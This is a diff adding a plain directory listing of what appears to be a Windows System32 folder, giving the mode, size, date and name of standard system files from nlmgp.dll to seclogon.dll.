@@ -1,0 +1,1915 @@
+100666/rw-rw-rw-  179200     fil   2009-07-13 19:12:18 -0500  nlmgp.dll                                        
+100666/rw-rw-rw-  13824      fil   2009-07-13 19:12:01 -0500  nlmsprep.dll                                     
+100666/rw-rw-rw-  69120      fil   2010-11-20 21:23:52 -0600  nlsbres.dll                                      
+100777/rwxrwxrwx  395776     fil   2010-11-20 21:24:33 -0600  nltest.exe                                       
+100666/rw-rw-rw-  2060       fil   2009-06-10 15:49:51 -0500  noise.jpn                                        
+100666/rw-rw-rw-  1486       fil   2009-07-13 21:35:51 -0500  noise.kor                                        
+100666/rw-rw-rw-  2560       fil   2009-07-13 18:26:06 -0500  normaliz.dll                                     
+100666/rw-rw-rw-  59342      fil   2009-06-10 16:10:12 -0500  normidna.nls                                     
+100666/rw-rw-rw-  47076      fil   2009-07-13 16:09:00 -0500  normnfc.nls                                      
+100666/rw-rw-rw-  40566      fil   2009-07-13 16:09:00 -0500  normnfd.nls                                      
+100666/rw-rw-rw-  67808      fil   2009-07-13 16:09:00 -0500  normnfkc.nls                                     
+100666/rw-rw-rw-  61718      fil   2009-07-13 16:09:00 -0500  normnfkd.nls                                     
+100777/rwxrwxrwx  193536     fil   2017-07-14 11:18:08 -0500  notepad.exe                                      
+100666/rw-rw-rw-  31744      fil   2009-07-13 19:12:01 -0500  npmproxy.dll                                     
+100666/rw-rw-rw-  15360      fil   2010-11-20 21:23:48 -0600  nrpsrv.dll                                       
+100666/rw-rw-rw-  35328      fil   2009-07-13 19:08:55 -0500  nshhttp.dll                                      
+100666/rw-rw-rw-  455168     fil   2010-11-20 21:24:02 -0600  nshipsec.dll                                     
+100666/rw-rw-rw-  830464     fil   2017-07-14 11:02:46 -0500  nshwfp.dll                                       
+100666/rw-rw-rw-  13824      fil   2009-07-13 18:21:05 -0500  nsi.dll                                          
+100666/rw-rw-rw-  25600      fil   2009-07-13 18:21:21 -0500  nsisvc.dll                                       
+100777/rwxrwxrwx  109568     fil   2010-11-20 21:24:08 -0600  nslookup.exe                                     
+100666/rw-rw-rw-  1732864    fil   2017-07-15 06:34:29 -0500  ntdll.dll                                        
+100666/rw-rw-rw-  152064     fil   2009-07-13 18:54:08 -0500  ntdsapi.dll                                      
+100666/rw-rw-rw-  129536     fil   2010-11-20 21:24:32 -0600  ntlanman.dll                                     
+100666/rw-rw-rw-  17920      fil   2009-07-13 18:57:16 -0500  ntlanui2.dll                                     
+100666/rw-rw-rw-  162304     fil   2009-07-13 18:50:40 -0500  ntmarta.dll                                      
+100777/rwxrwxrwx  5548264    fil   2017-07-15 06:34:29 -0500  ntoskrnl.exe                                     
+100666/rw-rw-rw-  344576     fil   2017-07-14 11:23:17 -0500  ntprint.dll                                      
+100777/rwxrwxrwx  61952      fil   2017-07-14 11:23:17 -0500  ntprint.exe                                      
+100666/rw-rw-rw-  509952     fil   2017-07-14 11:23:20 -0500  ntshrui.dll                                      
+100666/rw-rw-rw-  16384      fil   2017-07-15 06:34:27 -0500  ntvdm64.dll                                      
+100666/rw-rw-rw-  722944     fil   2017-07-14 11:22:05 -0500  objsel.dll                                       
+100666/rw-rw-rw-  147968     fil   2017-07-14 13:04:29 -0500  occache.dll                                      
+100666/rw-rw-rw-  161792     fil   2010-11-20 21:24:08 -0600  ocsetapi.dll                                     
+100777/rwxrwxrwx  186368     fil   2010-11-20 21:24:08 -0600  ocsetup.exe                                      
+100666/rw-rw-rw-  720896     fil   2010-11-20 21:23:48 -0600  odbc32.dll                                       
+100666/rw-rw-rw-  28672      fil   2009-07-13 19:28:29 -0500  odbc32gt.dll                                     
+100777/rwxrwxrwx  90112      fil   2009-07-13 19:28:30 -0500  odbcad32.exe                                     
+100666/rw-rw-rw-  57344      fil   2009-07-13 19:28:37 -0500  odbcbcp.dll                                      
+100666/rw-rw-rw-  53248      fil   2010-11-20 21:23:50 -0600  odbcconf.dll                                     
+100777/rwxrwxrwx  40960      fil   2009-07-13 19:28:35 -0500  odbcconf.exe                                     
+100666/rw-rw-rw-  263        fil   2009-07-13 18:14:22 -0500  odbcconf.rsp                                     
+100666/rw-rw-rw-  163840     fil   2017-07-14 11:24:48 -0500  odbccp32.dll                                     
+100666/rw-rw-rw-  106496     fil   2017-07-14 11:24:48 -0500  odbccr32.dll                                     
+100666/rw-rw-rw-  106496     fil   2017-07-14 11:24:48 -0500  odbccu32.dll                                     
+100666/rw-rw-rw-  229376     fil   2009-07-13 19:28:29 -0500  odbcint.dll                                      
+100666/rw-rw-rw-  212992     fil   2017-07-14 11:24:48 -0500  odbctrac.dll                                     
+100666/rw-rw-rw-  303616     fil   2009-07-13 19:28:18 -0500  offfilt.dll                                      
+100666/rw-rw-rw-  45568      fil   2017-07-14 11:20:06 -0500  oflc-nz.rs                                       
+100666/rw-rw-rw-  23552      fil   2017-07-14 11:20:05 -0500  oflc.rs                                          
+100666/rw-rw-rw-  1336832    fil   2009-07-13 18:42:51 -0500  ogldrv.dll                                       
+100666/rw-rw-rw-  2086912    fil   2010-11-20 21:23:48 -0600  ole32.dll                                        
+100666/rw-rw-rw-  331776     fil   2017-07-14 11:02:53 -0500  oleacc.dll                                       
+100666/rw-rw-rw-  10752      fil   2009-07-13 18:38:55 -0500  oleacchooks.dll                                  
+100666/rw-rw-rw-  4096       fil   2009-07-13 18:39:01 -0500  oleaccrc.dll                                     
+100666/rw-rw-rw-  862208     fil   2017-07-15 06:34:28 -0500  oleaut32.dll                                     
+100666/rw-rw-rw-  128000     fil   2009-07-13 18:59:22 -0500  oledlg.dll                                       
+100666/rw-rw-rw-  129536     fil   2009-07-13 19:39:58 -0500  oleprn.dll                                       
+100666/rw-rw-rw-  25600      fil   2009-07-13 18:59:12 -0500  oleres.dll                                       
+100666/rw-rw-rw-  235520     fil   2010-11-20 21:23:55 -0600  onex.dll                                         
+100666/rw-rw-rw-  1080320    fil   2010-11-20 21:23:55 -0600  onexui.dll                                       
+100777/rwxrwxrwx  843        fil   2009-07-13 15:24:21 -0500  onlinesetup.cmd                                  
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:11 -0500  oobe                                             
+100777/rwxrwxrwx  79872      fil   2009-07-13 18:25:36 -0500  openfiles.exe                                    
+100666/rw-rw-rw-  1039872    fil   2009-07-13 18:42:17 -0500  opengl32.dll                                     
+100666/rw-rw-rw-  25088      fil   2009-07-13 18:35:49 -0500  osbaseln.dll                                     
+100777/rwxrwxrwx  692736     fil   2017-07-14 11:22:48 -0500  osk.exe                                          
+100666/rw-rw-rw-  8192       fil   2009-07-13 18:30:34 -0500  osuninst.dll                                     
+100666/rw-rw-rw-  581120     fil   2009-07-13 19:11:32 -0500  p2pcollab.dll                                    
+100777/rwxrwxrwx  176128     fil   2009-07-13 19:11:38 -0500  p2phost.exe                                      
+100666/rw-rw-rw-  162304     fil   2009-07-13 19:11:21 -0500  p2pnetsh.dll                                     
+100666/rw-rw-rw-  438784     fil   2009-07-13 19:11:29 -0500  p2psvc.dll                                       
+100666/rw-rw-rw-  77824      fil   2017-07-14 11:10:24 -0500  packager.dll                                     
+100666/rw-rw-rw-  13312      fil   2009-07-13 18:56:45 -0500  panmap.dll                                       
+100666/rw-rw-rw-  50176      fil   2009-07-13 18:53:21 -0500  pautoenr.dll                                     
+100666/rw-rw-rw-  37376      fil   2009-07-13 18:32:15 -0500  pcadm.dll                                        
+100666/rw-rw-rw-  8704       fil   2009-07-13 18:32:13 -0500  pcaevts.dll                                      
+100777/rwxrwxrwx  9728       fil   2009-07-13 18:32:24 -0500  pcalua.exe                                       
+100666/rw-rw-rw-  186368     fil   2009-07-13 18:32:38 -0500  pcasvc.dll                                       
+100666/rw-rw-rw-  97280      fil   2009-07-13 18:32:37 -0500  pcaui.dll                                        
+100777/rwxrwxrwx  18432      fil   2009-07-13 18:32:18 -0500  pcaui.exe                                        
+100777/rwxrwxrwx  11264      fil   2009-07-13 18:32:32 -0500  pcawrk.exe                                       
+100666/rw-rw-rw-  114        fil   2009-07-13 18:16:33 -0500  pcl.sep                                          
+100777/rwxrwxrwx  13824      fil   2009-07-13 18:31:39 -0500  pcwrun.exe                                       
+100666/rw-rw-rw-  36864      fil   2009-07-13 18:19:25 -0500  pcwum.dll                                        
+100666/rw-rw-rw-  19968      fil   2009-07-13 18:31:38 -0500  pcwutl.dll                                       
+100666/rw-rw-rw-  300032     fil   2010-11-20 21:24:00 -0600  pdh.dll                                          
+100666/rw-rw-rw-  58368      fil   2009-07-13 18:31:40 -0500  pdhui.dll                                        
+100666/rw-rw-rw-  20480      fil   2017-07-14 11:20:05 -0500  pegi-fi.rs                                       
+100666/rw-rw-rw-  20480      fil   2017-07-14 11:20:06 -0500  pegi-pt.rs                                       
+100666/rw-rw-rw-  20480      fil   2017-07-14 11:20:06 -0500  pegi.rs                                          
+100666/rw-rw-rw-  44544      fil   2017-07-14 11:20:06 -0500  pegibbfc.rs                                      
+100666/rw-rw-rw-  127420     fil   2009-07-13 21:36:59 -0500  perfc009.dat                                     
+100666/rw-rw-rw-  44544      fil   2009-07-13 18:31:20 -0500  perfctrs.dll                                     
+100666/rw-rw-rw-  31548      fil   2009-07-13 21:36:59 -0500  perfd009.dat                                     
+100666/rw-rw-rw-  35328      fil   2009-07-13 18:31:20 -0500  perfdisk.dll                                     
+100666/rw-rw-rw-  677056     fil   2009-07-13 21:36:59 -0500  perfh009.dat                                     
+100666/rw-rw-rw-  291294     fil   2009-07-13 21:36:59 -0500  perfi009.dat                                     
+100777/rwxrwxrwx  172544     fil   2010-11-20 21:24:19 -0600  perfmon.exe                                      
+100666/rw-rw-rw-  145519     fil   2009-07-13 16:14:23 -0500  perfmon.msc                                      
+100666/rw-rw-rw-  23040      fil   2009-07-13 18:31:19 -0500  perfnet.dll                                      
+100666/rw-rw-rw-  29696      fil   2009-07-13 18:31:19 -0500  perfos.dll                                       
+100666/rw-rw-rw-  38400      fil   2009-07-13 18:31:20 -0500  perfproc.dll                                     
+100666/rw-rw-rw-  950272     fil   2017-07-14 11:29:26 -0500  perftrack.dll                                    
+100666/rw-rw-rw-  18944      fil   2009-07-13 19:17:10 -0500  perfts.dll                                       
+100666/rw-rw-rw-  175104     fil   2009-07-13 18:39:41 -0500  phon.ime                                         
+100666/rw-rw-rw-  409600     fil   2010-11-20 21:25:06 -0600  photowiz.dll                                     
+100666/rw-rw-rw-  46080      fil   2009-07-13 19:19:58 -0500  pid.dll                                          
+100666/rw-rw-rw-  1439232    fil   2009-07-13 20:05:40 -0500  pidgenx.dll                                      
+100666/rw-rw-rw-  35328      fil   2010-11-20 21:24:33 -0600  pifmgr.dll                                       
+100666/rw-rw-rw-  132608     fil   2009-07-13 18:39:41 -0500  pintlgnt.ime                                     
+100666/rw-rw-rw-  241152     fil   2017-07-14 11:11:38 -0500  pku2u.dll                                        
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:11 -0500  pl-PL                                            
+100666/rw-rw-rw-  1389056    fil   2010-11-20 21:24:00 -0600  pla.dll                                          
+100777/rwxrwxrwx  9216       fil   2009-07-13 18:31:25 -0500  plasrv.exe                                       
+100666/rw-rw-rw-  748032     fil   2009-07-13 19:41:09 -0500  pmcsnap.dll                                      
+100666/rw-rw-rw-  62464      fil   2017-07-14 13:04:29 -0500  pngfilt.dll                                      
+100666/rw-rw-rw-  1808384    fil   2010-11-20 21:23:54 -0600  pnidui.dll                                       
+100666/rw-rw-rw-  86528      fil   2009-07-13 18:27:06 -0500  pnpsetup.dll                                     
+100666/rw-rw-rw-  12288      fil   2009-07-13 18:31:56 -0500  pnpts.dll                                        
+100666/rw-rw-rw-  389120     fil   2009-07-13 18:27:44 -0500  pnpui.dll                                        
+100666/rw-rw-rw-  25088      fil   2009-07-13 19:11:25 -0500  pnrpauto.dll                                     
+100666/rw-rw-rw-  86016      fil   2009-07-13 19:11:11 -0500  pnrpnsp.dll                                      
+100666/rw-rw-rw-  327168     fil   2009-07-13 19:11:41 -0500  pnrpsvc.dll                                      
+100666/rw-rw-rw-  373760     fil   2017-07-14 11:10:46 -0500  polstore.dll                                     
+100777/rwxrwxrwx  142336     fil   2017-07-14 11:18:38 -0500  poqexec.exe                                      
+100666/rw-rw-rw-  27136      fil   2009-07-13 18:31:59 -0500  pots.dll                                         
+100666/rw-rw-rw-  173568     fil   2010-11-20 21:24:10 -0600  powercfg.cpl                                     
+100777/rwxrwxrwx  71168      fil   2009-07-13 18:27:42 -0500  powercfg.exe                                     
+100666/rw-rw-rw-  486400     fil   2010-11-20 21:24:09 -0600  powercpl.dll                                     
+100666/rw-rw-rw-  29696      fil   2017-07-14 11:29:26 -0500  powertracker.dll                                 
+100666/rw-rw-rw-  167424     fil   2009-07-13 18:27:45 -0500  powrprof.dll                                     
+100666/rw-rw-rw-  258048     fil   2009-07-13 19:40:28 -0500  ppcsnap.dll                                      
+100777/rwxrwxrwx  31232      fil   2017-07-14 11:10:23 -0500  prevhost.exe                                     
+100666/rw-rw-rw-  17408      fil   2009-07-13 18:19:21 -0500  prflbmsg.dll                                     
+100777/rwxrwxrwx  15360      fil   2009-07-13 18:25:29 -0500  print.exe                                        
+100666/rw-rw-rw-  35840      fil   2009-07-13 19:40:09 -0500  printfilterpipelineprxy.dll                      
+100777/rwxrwxrwx  748544     fil   2009-07-13 19:41:08 -0500  printfilterpipelinesvc.exe                       
+100666/rw-rw-rw-  146389     fil   2009-07-13 17:51:21 -0500  printmanagement.msc                              
+100666/rw-rw-rw-  1050624    fil   2010-11-20 21:24:09 -0600  printui.dll                                      
+100777/rwxrwxrwx  61952      fil   2009-07-13 19:40:18 -0500  printui.exe                                      
+100666/rw-rw-rw-  183808     fil   2010-11-20 21:24:00 -0600  prncache.dll                                     
+100666/rw-rw-rw-  416256     fil   2010-11-20 21:23:48 -0600  prnfldr.dll                                      
+100666/rw-rw-rw-  190976     fil   2009-07-13 19:40:27 -0500  prnntfy.dll                                      
+100666/rw-rw-rw-  156160     fil   2010-11-20 21:24:16 -0600  prntvpt.dll                                      
+100666/rw-rw-rw-  10240      fil   2009-07-13 18:22:29 -0500  procinst.dll                                     
+100666/rw-rw-rw-  44032      fil   2009-07-13 18:20:57 -0500  profapi.dll                                      
+100666/rw-rw-rw-  33792      fil   2010-11-20 21:24:01 -0600  profprov.dll                                     
+100666/rw-rw-rw-  210432     fil   2017-07-14 11:23:03 -0500  profsvc.dll                                      
+100666/rw-rw-rw-  1212416    fil   2010-11-20 21:23:55 -0600  propsys.dll                                      
+100777/rwxrwxrwx  31744      fil   2010-11-20 21:24:16 -0600  proquota.exe                                     
+100666/rw-rw-rw-  0          fil   2017-12-23 20:23:13 -0600  providerFx-log4cpp.log                           
+100666/rw-rw-rw-  0          fil   2017-12-23 20:23:13 -0600  providerFx-log4cpp_rolling.log                   
+100666/rw-rw-rw-  187904     fil   2010-11-20 21:24:51 -0600  provsvc.dll                                      
+100666/rw-rw-rw-  307200     fil   2009-07-13 18:47:20 -0500  provthrd.dll                                     
+100666/rw-rw-rw-  9216       fil   2009-07-13 18:26:22 -0500  psapi.dll                                        
+100666/rw-rw-rw-  52224      fil   2009-07-13 18:49:19 -0500  psbase.dll                                       
+100666/rw-rw-rw-  51         fil   2009-07-13 18:16:33 -0500  pscript.sep                                      
+100666/rw-rw-rw-  613888     fil   2017-07-14 11:18:07 -0500  psisdecd.dll                                     
+100666/rw-rw-rw-  108032     fil   2017-07-14 11:18:07 -0500  psisrndr.ax                                      
+100777/rwxrwxrwx  732672     fil   2009-07-13 18:33:06 -0500  psr.exe                                          
+100666/rw-rw-rw-  52736      fil   2009-07-13 18:49:14 -0500  pstorec.dll                                      
+100666/rw-rw-rw-  36352      fil   2009-07-13 18:49:17 -0500  pstorsvc.dll                                     
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:11 -0500  pt-BR                                            
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:11 -0500  pt-PT                                            
+100666/rw-rw-rw-  194560     fil   2009-07-13 19:40:25 -0500  puiapi.dll                                       
+100666/rw-rw-rw-  429568     fil   2010-11-20 21:23:50 -0600  puiobj.dll                                       
+100666/rw-rw-rw-  55296      fil   2009-07-13 18:49:02 -0500  pwrshplugin.dll                                  
+100777/rwxrwxrwx  23040      fil   2010-11-20 21:24:41 -0600  qappsrv.exe                                      
+100666/rw-rw-rw-  254464     fil   2017-07-14 11:11:29 -0500  qasf.dll                                         
+100666/rw-rw-rw-  181248     fil   2010-11-20 21:23:56 -0600  qcap.dll                                         
+100666/rw-rw-rw-  250880     fil   2010-11-20 21:23:56 -0600  qdv.dll                                          
+100666/rw-rw-rw-  371712     fil   2017-07-14 11:11:30 -0500  qdvd.dll                                         
+100666/rw-rw-rw-  624640     fil   2017-07-14 11:17:26 -0500  qedit.dll                                        
+100666/rw-rw-rw-  733184     fil   2009-07-13 19:18:31 -0500  qedwipes.dll                                     
+100666/rw-rw-rw-  175104     fil   2009-07-13 18:39:41 -0500  qintlgnt.ime                                     
+100666/rw-rw-rw-  849920     fil   2010-11-20 21:23:51 -0600  qmgr.dll                                         
+100666/rw-rw-rw-  44544      fil   2009-07-13 18:46:02 -0500  qmgrprxy.dll                                     
+100777/rwxrwxrwx  26624      fil   2010-11-20 21:24:41 -0600  qprocess.exe                                     
+100666/rw-rw-rw-  1573888    fil   2017-07-14 11:11:31 -0500  quartz.dll                                       
+100777/rwxrwxrwx  16384      fil   2010-11-20 21:24:41 -0600  query.exe                                        
+100666/rw-rw-rw-  175104     fil   2009-07-13 18:39:49 -0500  quick.ime                                        
+100777/rwxrwxrwx  24064      fil   2009-07-13 19:17:08 -0500  quser.exe                                        
+100666/rw-rw-rw-  242688     fil   2009-07-13 19:10:02 -0500  qwave.dll                                        
+100777/rwxrwxrwx  28672      fil   2009-07-13 19:17:10 -0500  qwinsta.exe                                      
+100666/rw-rw-rw-  119296     fil   2009-07-13 18:31:59 -0500  racpldlg.dll                                     
+100666/rw-rw-rw-  97792      fil   2009-07-13 18:32:03 -0500  radardt.dll                                      
+100666/rw-rw-rw-  71168      fil   2009-07-13 18:32:01 -0500  radarrs.dll                                      
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:11 -0500  ras                                              
+100666/rw-rw-rw-  16384      fil   2009-07-13 19:10:08 -0500  rasadhlp.dll                                     
+100666/rw-rw-rw-  384512     fil   2009-07-13 19:10:37 -0500  rasapi32.dll                                     
+100666/rw-rw-rw-  99328      fil   2009-07-13 19:10:11 -0500  rasauto.dll                                      
+100777/rwxrwxrwx  17920      fil   2009-07-13 19:10:10 -0500  rasautou.exe                                     
+100666/rw-rw-rw-  95744      fil   2009-07-13 19:10:30 -0500  rascfg.dll                                       
+100666/rw-rw-rw-  337920     fil   2010-11-20 21:24:10 -0600  raschap.dll                                      
+100666/rw-rw-rw-  1820       fil   2009-06-10 15:59:55 -0500  rasctrnm.h                                       
+100666/rw-rw-rw-  17408      fil   2009-07-13 19:10:14 -0500  rasctrs.dll                                      
+100666/rw-rw-rw-  76288      fil   2009-07-13 19:08:16 -0500  rasdiag.dll                                      
+100777/rwxrwxrwx  18944      fil   2009-07-13 19:10:16 -0500  rasdial.exe                                      
+100666/rw-rw-rw-  860672     fil   2009-07-13 19:10:30 -0500  rasdlg.dll                                       
+100777/rwxrwxrwx  125952     fil   2009-07-13 18:31:59 -0500  raserver.exe                                     
+100666/rw-rw-rw-  757760     fil   2009-07-13 19:10:29 -0500  rasgcw.dll                                       
+100666/rw-rw-rw-  100352     fil   2009-07-13 19:10:16 -0500  rasman.dll                                       
+100666/rw-rw-rw-  344064     fil   2010-11-20 21:24:17 -0600  rasmans.dll                                      
+100666/rw-rw-rw-  57344      fil   2009-07-13 19:10:21 -0500  rasmbmgr.dll                                     
+100666/rw-rw-rw-  248832     fil   2009-07-13 19:10:11 -0500  rasmontr.dll                                     
+100666/rw-rw-rw-  41472      fil   2009-07-13 19:10:10 -0500  rasmxs.dll                                       
+100777/rwxrwxrwx  42496      fil   2009-07-13 19:10:18 -0500  rasphone.exe                                     
+100666/rw-rw-rw-  405504     fil   2009-07-13 19:10:23 -0500  rasplap.dll                                      
+100666/rw-rw-rw-  211456     fil   2010-11-20 21:24:03 -0600  rasppp.dll                                       
+100666/rw-rw-rw-  29696      fil   2009-07-13 19:10:10 -0500  rasser.dll                                       
+100666/rw-rw-rw-  82432      fil   2009-07-13 19:10:12 -0500  rastapi.dll                                      
+100666/rw-rw-rw-  424448     fil   2017-07-14 11:10:36 -0500  rastls.dll                                       
+100666/rw-rw-rw-  10240      fil   2010-11-20 21:24:28 -0600  rdpcfgex.dll                                     
+100777/rwxrwxrwx  210944     fil   2010-11-20 21:24:41 -0600  rdpclip.exe                                      
+100666/rw-rw-rw-  1031680    fil   2017-07-14 11:01:19 -0500  rdpcore.dll                                      
+100666/rw-rw-rw-  150528     fil   2017-07-14 11:11:25 -0500  rdpcorekmts.dll                                  
+100666/rw-rw-rw-  68096      fil   2010-11-20 21:24:16 -0600  rdpd3d.dll                                       
+100666/rw-rw-rw-  274944     fil   2010-11-20 21:24:07 -0600  rdpdd.dll                                        
+100666/rw-rw-rw-  222208     fil   2010-11-20 21:24:16 -0600  rdpencom.dll                                     
+100666/rw-rw-rw-  167424     fil   2010-11-20 21:24:41 -0600  rdpendp.dll                                      
+100666/rw-rw-rw-  23040      fil   2010-11-20 21:24:32 -0600  rdprefdrvapi.dll                                 
+100666/rw-rw-rw-  77312      fil   2017-07-14 11:11:25 -0500  rdpwsx.dll                                       
+100777/rwxrwxrwx  40448      fil   2009-07-13 18:32:00 -0500  rdrleakdiag.exe                                  
+100777/rwxrwxrwx  9216       fil   2017-07-14 11:11:25 -0500  rdrmemptylst.exe                                 
+100777/rwxrwxrwx  238080     fil   2010-11-20 21:25:06 -0600  recdisc.exe                                      
+100777/rwxrwxrwx  12800      fil   2009-07-13 18:25:29 -0500  recover.exe                                      
+100666/rw-rw-rw-  146944     fil   2010-11-20 21:24:51 -0600  recovery.dll                                     
+100777/rwxrwxrwx  74752      fil   2009-07-13 18:26:13 -0500  reg.exe                                          
+100666/rw-rw-rw-  95232      fil   2010-11-20 21:23:56 -0600  regapi.dll                                       
+100777/rwxrwxrwx  10240      fil   2009-07-13 18:25:29 -0500  regedt32.exe                                     
+100666/rw-rw-rw-  14336      fil   2009-07-13 18:31:08 -0500  regidle.dll                                      
+100777/rwxrwxrwx  47104      fil   2009-07-13 19:14:07 -0500  regini.exe                                       
+100666/rw-rw-rw-  159232     fil   2009-07-13 18:31:15 -0500  regsvc.dll                                       
+100777/rwxrwxrwx  19456      fil   2009-07-13 19:14:15 -0500  regsvr32.exe                                     
+100777/rwxrwxrwx  69120      fil   2009-07-13 18:50:27 -0500  rekeywiz.exe                                     
+100777/rwxrwxrwx  43008      fil   2017-07-14 11:26:39 -0500  relog.exe                                        
+100666/rw-rw-rw-  153088     fil   2010-11-20 21:24:24 -0600  remotepg.dll                                     
+100666/rw-rw-rw-  102400     fil   2009-07-13 19:41:05 -0500  remotesp.tsp                                     
+100666/rw-rw-rw-  6144       fil   2009-07-13 18:31:52 -0500  rendezvousSession.tlb                            
+100777/rwxrwxrwx  51712      fil   2010-11-20 21:24:39 -0600  repair-bde.exe                                   
+100777/rwxrwxrwx  19968      fil   2009-07-13 18:25:31 -0500  replace.exe                                      
+100777/rwxrwxrwx  16896      fil   2010-11-20 21:24:41 -0600  reset.exe                                        
+100777/rwxrwxrwx  103936     fil   2009-07-13 18:31:45 -0500  resmon.exe                                       
+40777/rwxrwxrwx   0          dir   2009-07-14 00:32:38 -0500  restore                                          
+100666/rw-rw-rw-  86016      fil   2009-07-13 18:34:23 -0500  resutils.dll                                     
+100666/rw-rw-rw-  182784     fil   2009-07-13 18:41:20 -0500  rgb9rast.dll                                     
+100666/rw-rw-rw-  633344     fil   2010-11-20 21:24:15 -0600  riched20.dll                                     
+100666/rw-rw-rw-  10752      fil   2010-11-20 21:24:15 -0600  riched32.dll                                     
+100666/rw-rw-rw-  2560       fil   2009-07-13 19:10:28 -0500  rnr20.dll                                        
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:11 -0500  ro-RO                                            
+100666/rw-rw-rw-  190464     fil   2017-07-15 06:34:28 -0500  rpchttp.dll                                      
+100666/rw-rw-rw-  31744      fil   2009-07-13 18:59:10 -0500  rpcnsh.dll                                       
+100666/rw-rw-rw-  1212928    fil   2017-07-15 06:34:29 -0500  rpcrt4.dll                                       
+100666/rw-rw-rw-  512000     fil   2010-11-20 21:24:01 -0600  rpcss.dll                                        
+100777/rwxrwxrwx  55808      fil   2017-07-14 11:11:29 -0500  rrinstaller.exe                                  
+100666/rw-rw-rw-  281256     fil   2009-07-13 18:53:25 -0500  rsaenh.dll                                       
+100666/rw-rw-rw-  53760      fil   2009-07-13 18:57:31 -0500  rshx32.dll                                       
+100666/rw-rw-rw-  43566      fil   2009-07-13 16:44:17 -0500  rsop.msc                                         
+100777/rwxrwxrwx  296960     fil   2017-07-15 06:34:27 -0500  rstrui.exe                                       
+100666/rw-rw-rw-  41984      fil   2009-07-13 19:29:52 -0500  rtffilt.dll                                      
+100666/rw-rw-rw-  138240     fil   2009-07-13 19:10:21 -0500  rtm.dll                                          
+100666/rw-rw-rw-  52224      fil   2010-11-20 21:23:48 -0600  rtutils.dll                                      
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:11 -0500  ru-RU                                            
+100777/rwxrwxrwx  20480      fil   2009-07-13 18:25:32 -0500  runas.exe                                        
+100777/rwxrwxrwx  45568      fil   2009-07-13 18:57:20 -0500  rundll32.exe                                     
+100777/rwxrwxrwx  56832      fil   2010-11-20 21:24:27 -0600  runonce.exe                                      
+100777/rwxrwxrwx  21504      fil   2010-11-20 21:24:41 -0600  rwinsta.exe                                      
+100666/rw-rw-rw-  67584      fil   2010-11-20 21:24:28 -0600  samcli.dll                                       
+100666/rw-rw-rw-  107008     fil   2009-07-13 18:53:43 -0500  samlib.dll                                       
+100666/rw-rw-rw-  758784     fil   2010-11-20 21:24:20 -0600  samsrv.dll                                       
+100666/rw-rw-rw-  12800      fil   2009-07-13 18:52:26 -0500  sas.dll                                          
+100666/rw-rw-rw-  1118720    fil   2017-07-14 11:24:02 -0500  sbe.dll                                          
+100666/rw-rw-rw-  212480     fil   2009-07-13 19:20:52 -0500  sbeio.dll                                        
+100666/rw-rw-rw-  65536      fil   2009-07-13 19:20:52 -0500  sberes.dll                                       
+100777/rwxrwxrwx  13824      fil   2009-07-13 18:56:01 -0500  sbunattend.exe                                   
+100777/rwxrwxrwx  45056      fil   2009-07-13 18:31:14 -0500  sc.exe                                           
+100666/rw-rw-rw-  303616     fil   2010-11-20 21:24:48 -0600  scansetting.dll                                  
+100666/rw-rw-rw-  461312     fil   2017-07-14 11:02:46 -0500  scavengeui.dll                                   
+100666/rw-rw-rw-  65536      fil   2009-07-13 18:50:14 -0500  sccls.dll                                        
+100666/rw-rw-rw-  232960     fil   2010-11-20 21:24:32 -0600  scecli.dll                                       
+100666/rw-rw-rw-  406528     fil   2017-07-14 11:10:23 -0500  scesrv.dll                                       
+100666/rw-rw-rw-  89088      fil   2009-07-13 18:31:14 -0500  scext.dll                                        
+100666/rw-rw-rw-  345600     fil   2017-07-15 06:34:29 -0500  schannel.dll                                     
+100666/rw-rw-rw-  24064      fil   2010-11-20 21:24:01 -0600  schedcli.dll                                     
+100666/rw-rw-rw-  1110016    fil   2017-07-14 11:24:00 -0500  schedsvc.dll                                     
+100777/rwxrwxrwx  285696     fil   2010-11-20 21:24:26 -0600  schtasks.exe                                     
+100666/rw-rw-rw-  225792     fil   2009-07-13 18:50:17 -0500  scksp.dll                                        
+100666/rw-rw-rw-  77312      fil   2009-07-13 19:29:01 -0500  scripto.dll                                      
+100666/rw-rw-rw-  11264      fil   2009-07-13 18:56:35 -0500  scrnsave.scr                                     
+100666/rw-rw-rw-  230400     fil   2009-07-13 18:58:29 -0500  scrobj.dll                                       
+100666/rw-rw-rw-  568832     fil   2010-11-20 21:24:41 -0600  scrptadm.dll                                     
+100666/rw-rw-rw-  202752     fil   2017-07-14 11:09:08 -0500  scrrun.dll                                       
+100666/rw-rw-rw-  48640      fil   2009-07-13 18:36:42 -0500  sdautoplay.dll                                   
+100777/rwxrwxrwx  23552      fil   2017-07-14 11:18:47 -0500  sdbinst.exe                                      
+100777/rwxrwxrwx  51712      fil   2009-07-13 18:31:55 -0500  sdchange.exe                                     
+100777/rwxrwxrwx  1264640    fil   2010-11-20 21:25:06 -0600  sdclt.exe                                        
+100666/rw-rw-rw-  762368     fil   2010-11-20 21:25:06 -0600  sdcpl.dll                                        
+100666/rw-rw-rw-  1120768    fil   2010-11-20 21:25:06 -0600  sdengin2.dll                                     
+100666/rw-rw-rw-  34304      fil   2009-07-13 18:31:07 -0500  sdhcinst.dll                                     
+100666/rw-rw-rw-  210944     fil   2009-07-13 18:31:33 -0500  sdiageng.dll                                     
+100777/rwxrwxrwx  23552      fil   2009-07-13 18:31:32 -0500  sdiagnhost.exe                                   
+100666/rw-rw-rw-  230400     fil   2009-07-13 18:31:34 -0500  sdiagprv.dll                                     
+100666/rw-rw-rw-  51200      fil   2009-07-13 18:31:33 -0500  sdiagschd.dll                                    
+100666/rw-rw-rw-  543232     fil   2009-07-13 19:09:04 -0500  sdohlp.dll                                       
+100666/rw-rw-rw-  170496     fil   2010-11-20 21:25:06 -0600  sdrsvc.dll                                       
+100666/rw-rw-rw-  126464     fil   2009-07-13 18:36:44 -0500  sdshext.dll                                      
+100666/rw-rw-rw-  113664     fil   2017-07-14 11:26:39 -0500  sechost.dll                                      
+100777/rwxrwxrwx  16896      fil   2009-07-13 18:35:24 -0500  secinit.exe                                      
+100666/rw-rw-rw-  30720      fil   2017-07-14 11:11:07 -0500  seclogon.dll                                     
